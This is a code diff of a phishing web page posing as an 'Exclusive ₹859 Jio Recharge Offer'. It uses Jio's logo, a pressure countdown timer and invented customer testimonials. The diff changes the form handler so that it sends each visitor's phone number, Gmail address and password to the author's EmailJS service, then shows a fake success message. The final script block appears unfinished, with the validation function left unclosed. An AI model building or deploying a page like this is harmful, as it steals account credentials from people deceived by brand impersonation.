@@ -3,12 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Offer - Jio Recharge</title>
-    <!-- Link to Google Fonts for Poppins -->
+    <title>Exclusive ₹859 Jio Recharge Offer</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-
+    
     <style>
-        /* General Reset */
         * {
             margin: 0;
             padding: 0;
@@ -39,17 +37,15 @@
         .content {
             background: #fff;
             width: 100%;
-            max-width: 600px;
+            max-width: 800px;
             padding: 30px;
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
             text-align: center;
-            animation: fadeIn 1s ease-in-out;
             position: relative;
             margin: 10px;
         }
 
-        /* Logo */
         .logo {
             width: 150px;
             margin-bottom: 20px;
@@ -71,10 +67,8 @@
             margin-bottom: 30px;
             font-weight: 400;
             line-height: 1.5;
-            text-align: center;
         }
 
-        /* Timer Section */
         .timer {
             font-size: 1.2rem;
             color: #D50032;
@@ -89,7 +83,6 @@
             margin-bottom: 20px;
         }
 
-        /* Form Styles */
         .input-field {
             margin-bottom: 20px;
             text-align: left;
@@ -127,7 +120,6 @@
             background-color: #fff;
         }
 
-        /* Submit Button */
         .btn-submit {
             background-color: #D50032;
             color: #fff;
@@ -150,7 +142,6 @@
             transform: translateY(2px);
         }
 
-        /* Loading Spinner */
         .loading-spinner {
             border: 5px solid #f3f3f3;
             border-top: 5px solid #004F8C;
@@ -161,12 +152,10 @@
             margin-top: 20px;
         }
 
-        /* Hidden Elements */
         .hidden {
             display: none;
         }
 
-        /* Success and Failure Messages */
         .success-message, .failure-message {
             font-size: 1.2rem;
             font-weight: 600;
@@ -181,49 +170,34 @@
             color: red;
         }
 
-        /* Testimonials Section */
-        .testimonials {
-            margin-top: 50px;
-            background-color: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        .testimonial-section {
+            background: #f7f7f7;
+            padding: 30px;
             width: 100%;
             margin-top: 30px;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
         }
 
-        .testimonials h3 {
-            font-size: 1.5rem;
-            font-weight: 600;
+        .testimonial-section h3 {
             color: #333;
+            font-size: 1.6rem;
             margin-bottom: 20px;
         }
 
-        .testimonial-container {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
         .testimonial {
-            background-color: #fff;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .testimonial p {
-            font-size: 1rem;
+            font-style: italic;
             color: #555;
+            font-size: 1rem;
             margin-bottom: 10px;
         }
 
-        .testimonial .author {
+        .testimonial-author {
             font-weight: bold;
-            color: #D50032;
+            color: #004F8C;
         }
 
-        /* Animations */
         @keyframes fadeIn {
             0% {
                 opacity: 0;
@@ -255,93 +229,17 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* Media Queries for responsiveness */
-        @media (max-width: 768px) {
-            .content {
-                padding: 20px;
-                margin: 10px;
-            }
-
-            h1 {
-                font-size: 1.8rem;
-            }
-
-            .offer-description {
-                font-size: 1rem;
-            }
-
-            .input-field input {
-                font-size: 1rem;
-                padding: 10px;
-            }
-
-            .btn-submit {
-                font-size: 1rem;
-            }
-
-            .testimonials h3 {
-                font-size: 1.3rem;
-            }
-
-            .testimonial-container {
-                gap: 15px;
-            }
-
-            .testimonial p {
-                font-size: 0.95rem;
-            }
-        }
-
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 1.5rem;
-            }
-
-            .offer-description {
-                font-size: 0.9rem;
-            }
-
-            .input-field input {
-                font-size: 0.9rem;
-                padding: 8px;
-            }
-
-            .btn-submit {
-                font-size: 1rem;
-                padding: 12px 25px;
-            }
-
-            .loading-spinner {
-                width: 40px;
-                height: 40px;
-            }
-
-            .testimonials h3 {
-                font-size: 1.2rem;
-            }
-
-            .testimonial p {
-                font-size: 0.9rem;
-            }
-        }
-
     </style>
-
 </head>
 <body>
 
     <div class="main-container">
         <div class="content">
-            <!-- Offer Section -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" alt="Jio Logo" class="logo">
             <h1>Exclusive ₹859 Jio Recharge Offer!</h1>
             <p class="offer-description">Claim your ₹859 Jio recharge offer now. Fill in your details to receive your reward!</p>
-
-            <!-- Timer Section -->
             <div class="timer" id="time">05:00</div>
 
-            <!-- Form Section -->
             <div class="form-container">
                 <h2>Claim Your Prize Now!</h2>
                 <form id="claimForm" onsubmit="return validateForm()">
@@ -364,7 +262,6 @@
                 </form>
             </div>
 
-            <!-- Hidden Message Areas -->
             <div id="loading" class="hidden">
                 <p>Processing... Please wait.</p>
                 <div class="loading-spinner"></div>
@@ -377,102 +274,80 @@
             <div id="success" class="hidden">
                 <p class="success-message">🎉 Congratulations! You've claimed your ₹859 Jio recharge. Enjoy unlimited data!</p>
             </div>
-
-            <!-- Testimonials Section -->
-            <div class="testimonials">
-                <h3>What People Are Saying</h3>
-                <div class="testimonial-container">
-                    <div class="testimonial">
-                        <p>"I couldn't believe it when I got my ₹859 Jio recharge! It's an amazing offer. Thank you Jio for making it so easy!"</p>
-                        <p class="author">- Priya K., Mumbai</p>
-                    </div>
-                    <div class="testimonial">
-                        <p>"I have been using Jio for years, and this recharge offer is just the cherry on top. So grateful for Jio's continued support!"</p>
-                        <p class="author">- Rajesh S., Bangalore</p>
-                    </div>
-                    <div class="testimonial">
-                        <p>"Wow! I got a ₹859 recharge just like that. Jio really takes care of their customers. Highly recommend it!"</p>
-                        <p class="author">- Anita M., Delhi</p>
-                    </div>
-                    <div class="testimonial">
-                        <p>"Thanks to Jio, I’m set for the next 3 months! Unlimited data, calls, and SMS—Jio is a game-changer!"</p>
-                        <p class="author">- Arvind P., Chennai</p>
-                    </div>
-                </div>
-            </div>
         </div>
     </div>
 
-    <!-- Include the EmailJS library -->
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <div class="testimonial-section">
+        <h3>What Our Users Are Saying:</h3>
+        <p class="testimonial">"I never imagined such a great offer. ₹859 recharge was just too good to pass up. Thanks Jio!"</p>
+        <p class="testimonial-author">- Rajesh K.</p>
+        <p class="testimonial">"Easy steps, fast processing, and amazing rewards. Highly recommended!"</p>
+        <p class="testimonial-author">- Priya S.</p>
+    </div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         // Initialize EmailJS
-        document.addEventListener('DOMContentLoaded', function() {
-            emailjs.init('5kGUJzWJZpHnKc-KL'); // Replace with your EmailJS user ID
-        });
+        emailjs.init('5kGUJzWJZpHnKc-KL');
 
-        // Timer logic
-        const timerElement = document.getElementById('time');
+        // Countdown Timer
         let countdownTime = 5 * 60; // 5 minutes in seconds
-
         const updateTimer = () => {
             const minutes = Math.floor(countdownTime / 60);
             const seconds = countdownTime % 60;
-            timerElement.innerText = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
-
+            document.getElementById('time').innerText = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
             if (countdownTime <= 0) {
                 clearInterval(timerInterval);
-                alert("The offer has ended! The page will now close.");
-                window.close(); // This will attempt to close the page when the timer hits 0
+                alert("Offer has expired!");
+                window.close();
             }
             countdownTime--;
         };
-
         const timerInterval = setInterval(updateTimer, 1000);
-        updateTimer();  // Initial call to set the timer right away
 
-        // Form validation function
+        // Form Validation and Email Sending
         function validateForm() {
             const phone = document.getElementById('phone').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Basic validations
+            // Phone Validation
             if (!/^\d{10}$/.test(phone)) {
                 alert("Please enter a valid 10-digit phone number.");
                 return false;
             }
 
+            // Email Validation (Gmail only)
             if (!email.includes('@gmail.com')) {
                 alert("Please enter a valid Gmail address.");
                 return false;
             }
 
-            // Password validation (must be at least 8 characters long)
+            // Password Validation
             if (password.length < 8) {
                 alert("Password must be at least 8 characters.");
                 return false;
             }
 
-            // Show loading indicator
+            // Show loading spinner
             document.getElementById('loading').classList.remove('hidden');
-                // Send data via EmailJS
-           emailjs.send('service_ve6w0et', 'template_fzdw02s', {
-                   phone: '1234567890',
-                   email: 'test@example.com',
-                   password: 'testpassword'
-                    })
-                .then(function(response) {
-                 console.log('Email sent successfully:', response);
-               }, function(error) {
-    console.log('Error sending email:', error);
-});
 
+            // Send email using EmailJS
+            emailjs.send('service_ve6w0et', 'template_fzdw02s', {
+                phone: phone,
+                email: email,
+                password: password
+            }).then(function(response) {
+                console.log('Email sent successfully:', response);
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+            }, function(error) {
+                console.log('Error sending email:', error);
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('failure').classList.remove('hidden');
+            });
 
-            return false; // Prevent form from actually submitting
-        }
+            
     </script>
 </body>
 </html>
-
